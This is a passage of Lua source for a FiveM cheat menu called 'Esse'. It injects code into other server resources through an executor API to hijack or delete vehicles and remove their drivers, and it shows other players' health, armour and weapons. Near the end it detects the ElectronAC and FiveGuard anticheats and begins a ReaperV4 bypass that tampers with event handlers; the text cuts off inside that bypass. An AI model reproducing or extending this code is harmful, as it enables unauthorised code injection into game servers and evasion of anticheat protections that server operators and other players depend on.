                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end
                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                        hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                        hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                        local function RequestControl(entity, timeoutMs)
                            timeoutMs = timeoutMs or 2000
                            local start = GetGameTimer()

                            while (GetGameTimer() - start) < timeoutMs do
                                if NetworkHasControlOfEntity(entity) then return true end
                                NetworkRequestControlOfEntity(entity)
                                Wait(0)
                            end

                            return NetworkHasControlOfEntity(entity)
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        function GetEmptySeat(vehicle)
                            local seats = { -1, 0, 1, 2 }

                            for _, seat in ipairs(seats) do
                                if IsVehicleSeatFree(vehicle, seat) then
                                    return seat
                                end
                            end

                            return -1
                        end

                        local player = PlayerPedId()
                        local oldCoords = GetEntityCoords(player)
                        local camCoords = GetCamCoord(_G[FLAG_CAM])
                        local rot = GetCamRot(_G[FLAG_CAM], 2)
                        local forward = RotationToDirection(rot)
                        local rayLength = 1000.0
                        local targetPos = camCoords + forward * rayLength
                        local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                        local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                        local function HijackCar(vehicle)
                            if not vehicle or not DoesEntityExist(vehicle) then
                                return
                            end

                            local driver = GetPedInVehicleSeat(vehicle, -1)
                            if driver ~= 0 and DoesEntityExist(driver) then
                                SetPedIntoVehicle(player, vehicle, 0)
                                RequestControl(vehicle, 2000)
                                Wait(10)

                                for i = 0, 4 do
                                    DeletePed(driver)
                                end

                                Wait(40)
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(1)
                                SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                Wait(1)
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(450)
                                ClearPedTasksImmediately(player)
                                Wait(250)
                                SetPedIntoVehicle(player, vehicle, -1)
                            end
                        end

                        CreateThread(function()
                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit

                                    HijackCar(vehicle)
                                end
                            end
                        end)
                    ]])
                    else
                        if _G.EsseFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity",
                                function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.EsseFreecamObject)
                            local rot = GetCamRot(_G.EsseFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x,
                                targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource2("AsThreadNs", "monitor", [[
                                        DeletePed(]] .. driver .. [[)
                                    ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Delete Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                        local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                            or (GetResourceState("WaveShield") == "started" and "WaveShield")
                            or "any"

                        Injection(targetRes, [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end
                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                        hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                        hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                        local function RequestControl(entity, timeoutMs)
                            timeoutMs = timeoutMs or 2000
                            local start = GetGameTimer()

                            while (GetGameTimer() - start) < timeoutMs do
                                if NetworkHasControlOfEntity(entity) then return true end
                                NetworkRequestControlOfEntity(entity)
                                Wait(0)
                            end

                            return NetworkHasControlOfEntity(entity)
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        function GetEmptySeat(vehicle)
                            local seats = { -1, 0, 1, 2 }

                            for _, seat in ipairs(seats) do
                                if IsVehicleSeatFree(vehicle, seat) then
                                    return seat
                                end
                            end

                            return -1
                        end

                        local player = PlayerPedId()
                        local oldCoords = GetEntityCoords(player)
                        local camCoords = GetCamCoord(_G[FLAG_CAM])
                        local rot = GetCamRot(_G[FLAG_CAM], 2)
                        local forward = RotationToDirection(rot)
                        local rayLength = 1000.0
                        local targetPos = camCoords + forward * rayLength
                        local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                        local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                        local function DeleteCar(vehicle)
                            if not vehicle or not DoesEntityExist(vehicle) then
                                return
                            end

                            local driver = GetPedInVehicleSeat(vehicle, -1)
                            if driver ~= 0 and DoesEntityExist(driver) then
                                SetPedIntoVehicle(player, vehicle, 0)
                                RequestControl(vehicle, 2000)
                                Wait(10)

                                for i = 0, 4 do
                                    DeletePed(driver)
                                end

                                Wait(40)
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(1)
                                SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                Wait(1)
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(450)
                                ClearPedTasksImmediately(player)
                                SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                Wait(100)
                                DeleteEntity(vehicle)
                            else
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(100)
                                DeleteEntity(vehicle)
                                Wait(100)
                                SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                            end
                        end

                        CreateThread(function()
                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit

                                    DeleteCar(vehicle)
                                end
                            end
                        end)
                    ]])
                    else
                        if _G.EsseFreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity",
                                function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.EsseFreecamObject)
                            local rot = GetCamRot(_G.EsseFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x,
                                targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource2("AsThreadNs", "monitor", [[
                                        DeletePed(]] .. driver .. [[)
                                    ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true,
                                        true, true)
                                    Wait(100)
                                    MachoInjectResource2("AsThreadNs", "monitor", [[
                                    DeleteEntity(]] .. vehicle .. [[)
                                ]])
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    MachoInjectResource2("AsThreadNs", "monitor", [[
                                    DeleteEntity(]] .. vehicle .. [[)
                                ]])
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true,
                                        true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end

        local hoveredTab = CurrentMenu[HoveredIndex]

        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    if IsControlPressed(0, 174) and now - lastSliderPress > sliderDelay then
                        Esse:ScrollTwo("Left")
                        lastSliderPress = now
                    elseif IsControlPressed(0, 175) and now - lastSliderPress > sliderDelay then
                        Esse:ScrollTwo("Right")
                        lastSliderPress = now
                    end
                else
                    if IsControlPressed(0, 174) then
                        Esse:ScrollTwo("Left")
                    elseif IsControlPressed(0, 175) then
                        Esse:ScrollTwo("Right")
                    end
                end
            end
        end
    end
end)

local lastScrollPress = 0
local scrollDelay = 120
local lastSliderPress = 0
local sliderDelay = 120
local lastCategoryPress = 0
local categoryDelay = 120

MachoOnKeyDown(function(Callback)
    local keyCode = tonumber(Callback) or Callback
    local keyName = MappedKeys[keyCode] or "Unknown"
    local scrollNow = GetGameTimer()

    if keyName == MenuKey then
        if MenuOpenable then
            if not IsVisible then
                Esse:ShowUI()
            else
                Esse:HideUI()
            end
        end
    elseif keyName == "Backspace" then
        if IsVisible and MenuOpenable then Esse:Backspace() end
    elseif keyName == "Enter" then
        if IsVisible and MenuOpenable then Esse:Enter() end
    elseif keyName == "Q" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then Esse:PrevCategory() end
    elseif keyName == "E" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then Esse:NextCategory() end
    elseif keyName == "ArrowUp" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then
            Esse:ScrollOne("Up")
            lastScrollPress = scrollNow
        end
    elseif keyName == "ArrowDown" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then
            Esse:ScrollOne("Down")
            lastScrollPress = scrollNow
        end
    elseif keyName == "ArrowLeft" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    Esse:ScrollTwo("Left")
                    lastSliderPress = now
                else
                    Esse:ScrollTwo("Left")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                Esse:ScrollTwo("Left")
            end
        end
    elseif keyName == "ArrowRight" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    Esse:ScrollTwo("Right")
                    lastSliderPress = now
                else
                    Esse:ScrollTwo("Right")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                Esse:ScrollTwo("Right")
            end
        end
    elseif keyName == "F5" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if IsVisible and MenuOpenable and hoveredTab and (hoveredTab.type == "button" or hoveredTab.type == "checkbox" or hoveredTab.type == "slider-checkbox") then
            Esse:HideUI()
            Wait(250)
            KeyboardInput(("Bind %s"):format(hoveredTab.label), "", function(val)
                for vk, name in pairs(MappedKeys) do
                    if name:lower() == val:lower() then
                        local fivemControl = VK_TO_FIVEM[vk]

                        for i, data in pairs(MenuKeybinds) do
                            if data.keyRaw == vk then
                                Esse:Notify("error", "Esse", "There is already a keybind with that key!",
                                    3000)
                                return
                            end
                        end

                        if fivemControl then
                            MenuKeybinds[#MenuKeybinds + 1] = {
                                key = fivemControl,
                                keyRaw = vk,
                                keyLabel = MappedKeys[vk],
                                type = hoveredTab.type,
                                label = hoveredTab.label,
                                checked = hoveredTab.checked or false,
                                value = hoveredTab.value or 1.0,
                                step = hoveredTab.step or 0.25,
                                min = hoveredTab.min or 0.25,
                                max = hoveredTab.max or 5.0,
                                onSelect = hoveredTab.onSelect,
                            }

                            Esse:ShowKeybindList(MenuKeybinds)
                        end

                        Wait(500)
                        Esse:ShowUI()

                        return
                    end
                end
            end, "keybind")
        end
    else
        if MenuOpenable then
            for _, data in pairs(MenuKeybinds) do
                if data.type == "button" then
                    local key = data.keyRaw
                    if key then
                        if key == keyCode then
                            data.onSelect()
                            Esse:Notify("success", "Esse", ("You have executed %s!"):format(data.label), 3000)
                        end
                    end
                elseif data.type == "checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        Esse:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.checked)
                        end

                        Esse:ShowKeybindList(MenuKeybinds)
                        Esse:Notify(data.checked and "success" or "error", "Esse",
                            ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            Esse:UpdateElements(CurrentMenu)
                        end
                    end
                elseif data.type == "slider-checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        Esse:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.value, data.checked)
                        end

                        Esse:ShowKeybindList(MenuKeybinds)
                        Esse:Notify(data.checked and "success" or "error", "Esse",
                            ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            Esse:UpdateElements(CurrentMenu)
                        end
                    end
                end
            end
        end
    end
end)

function Esse:InListMenu()
    return CurrentCategories and CurrentCategories[CurrentCategoryIndex] and
    (CurrentCategories[CurrentCategoryIndex].label == "List" or CurrentCategories[CurrentCategoryIndex].label == "Safe")
end

function Esse:SelectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = true
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = true
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function Esse:UnselectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = false
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = false
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function Esse:ClearSelection()
    CPlayers = {}
    if CurrentCategories and CurrentCategories[CurrentCategoryIndex] then
        local category = CurrentCategories[CurrentCategoryIndex]
        if category.label == "List" and category.tabs then
            for _, tab in ipairs(category.tabs) do
                if tab.type == "checkbox" then
                    tab.checked = false
                end
            end
        end
    end

    Esse:UnselectEveryone()
end

function Esse:UpdateListMenu()
    if not IsVisible then return end
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    local coords = GetEntityCoords(PlayerPedId())
    if not coords then return end

    local nearbyPlayers = self:GetNearbyPlayers(coords, 350.0, true)
    local dividerIndex
    for i, tab in ipairs(category.tabs) do
        if tab.type == "divider" and tab.label == "Nearby Players" then
            dividerIndex = i
            break
        end
    end
    if not dividerIndex then return end

    -- Alisin lahat ng lumang player entries (yung nasa ibaba ng divider)
    for i = #category.tabs, dividerIndex + 1, -1 do
        table.remove(category.tabs, i)
    end

    if #nearbyPlayers == 0 then
        category.tabs[#category.tabs + 1] = {
            type = "button",
            label = "No Nearby Players",
            disabled = true
        }
    else
        table.sort(nearbyPlayers, function(a, b) return tonumber(a.serverId) < tonumber(b.serverId) end)

        -- Hanapin kung may napili nang player
        local selectedSid = nil
        for sid, checked in pairs(CPlayers) do
            if checked then
                selectedSid = sid
                break
            end
        end

        for _, player in ipairs(nearbyPlayers) do
            local sid = tonumber(player.serverId)
            if sid and player.name then
                local _, currentWeapon = GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(sid)))
                local isChecked = (CPlayers[sid] == true)
                local isDisabled = (selectedSid ~= nil and selectedSid ~= sid)

                category.tabs[#category.tabs + 1] = {
                    type = "checkbox",
                    label = ("%s - [%s]"):format(player.name, sid),
                    serverId = sid,
                    checked = isChecked,
                    disabled = isDisabled, -- <-- ITO ANG SUSI
                    name = player.name,
                    vehicle = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and
                    GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or nil,
                    isDriver = GetPedInVehicleSeat(
                    GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and
                    GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))), -1) ==
                    GetPlayerPed(GetPlayerFromServerId(sid)) or false,
                    metaData = {
                        { key = "Distance",  value = math.floor(#(GetEntityCoords(PlayerPedId()) - GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(sid))))) .. ".0m" },
                        { key = "Server ID", value = sid },
                        { key = "Health",    value = GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(sid))),                                                                                          color = "0, 255, 17" },
                        { key = "Armour",    value = GetPedArmour(GetPlayerPed(GetPlayerFromServerId(sid))),                                                                                             color = "0, 132, 255" },
                        { key = "Weapon",    value = WeaponsLabels[currentWeapon] or "Unknown" },
                        { key = "Vehicle",   value = GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) ~= 0 and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(sid))) or "Unknown" },
                        { key = "Alive",     value = IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(sid))) and "Dead" or "Alive" },
                        { key = "Speed",     value = math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(sid))) * 3.6) .. ".0 km/h" },
                        { key = "Visible",   value = IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(sid))) and "Visible" or "Invisible" },
                    },
                    onSelect = function(checked)
                        if checked then
                            -- I-uncheck lahat, tapos i-check ito
                            for osid, _ in pairs(CPlayers) do
                                CPlayers[osid] = false
                            end
                            CPlayers[sid] = true
                        else
                            -- I-uncheck lang ito
                            CPlayers[sid] = false
                        end
                        -- I-refresh agad para mag-update ang disabled states
                        Esse:UpdateListMenu()
                    end
                }
            end
        end
    end

    -- Alisin sa CPlayers ang mga wala na sa nearby
    for serverId, _ in pairs(CPlayers) do
        local stillNearby = false
        for _, player in ipairs(nearbyPlayers) do
            if tonumber(player.serverId) == tonumber(serverId) then
                stillNearby = true
                break
            end
        end
        if not stillNearby then
            CPlayers[serverId] = nil
        end
    end

    HoveredIndex = math.min(HoveredIndex or 1, math.max(1, #category.tabs))

    local ok, err = pcall(function()
        self:UpdateElements(CurrentMenu)
    end)
    if not ok then
        print("^7[^5Esse^7]: UI update error: " .. tostring(err))
    end
end

function Esse:AssignListMenuActions()
    if not ActiveMenu then return end

    for _, subMenu in ipairs(ActiveMenu) do
        if subMenu.label == "Server" and subMenu.categories then
            for _, category in ipairs(subMenu.categories) do
                if category.label == "List" and category.tabs then
                    for _, tab in ipairs(category.tabs) do
                        if tab.type == "button" then
                            if tab.label == "Clear Selection" then
                                tab.onSelect = function() Esse:ClearSelection() end
                            end
                        end
                    end
                end
            end
        end
    end
end

CreateThread(function()
    while true do
        Wait(1500)
        if Esse:InListMenu() and IsVisible then
            local ok, err = pcall(function()
                Esse:UpdateListMenu()
            end)
            if not ok then
                print("^7[^Esse^7]: List update error: " .. tostring(err))
            end
        end
    end
end)

Wait(500)


local function ScanElectronAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest and (string.find(manifest, "https://electron-services.com") or string.find(manifest, "Electron Services") or string.find(manifest, "The most advanced fiveM anticheat")) then
            electronResource = resource
            print("^7[^5Esse^7]: Detected ElectronAC in Resource: " .. resource)
            return resource
        end
    end

    return nil
end

local function ScanFiveGuardAnticheat()
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local metadata = GetResourceMetadata(resource, 'client_script', j)
            if metadata and string.find(metadata, "obfuscated") then
                fiveguardResource = resource
                print("^7[^5Esse^7]: Detected FiveGuard in Resource: " .. resource)
                return resource
            end
        end
    end

    return nil
end

function Esse:LoadBypass()
    local restrictedIPs = {
        "216.146.24.88:30120",
        "91.190.154.74:30120"
    }
    local currentEndpoint = GetCurrentServerEndpoint()
    for _, ip in ipairs(restrictedIPs) do
        if currentEndpoint == ip then
            self:Notify("error", "Esse", "Bypass disabled for this server.", 3000)
            return
        end
    end

    self:Notify("info", "Esse", "Loading Anticheat Bypass...", 3000)
    ScanElectronAnticheat()
    ScanFiveGuardAnticheat()
    Wait(1000)

    -- 3. Complex Gameplay Cam Checks
    -- ReaperV4 Bypass
    if GetResourceState("ReaperV4") == "started" then
        MachoInjectResource2("AsThreadNs", "ReaperV4", [[
        pcall(function()
            local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
            local eventHandlers = {}
            for name, raw in pairs(eventHandlersRaw) do
                if raw.handlers then
                    for id, v in pairs(raw.handlers) do
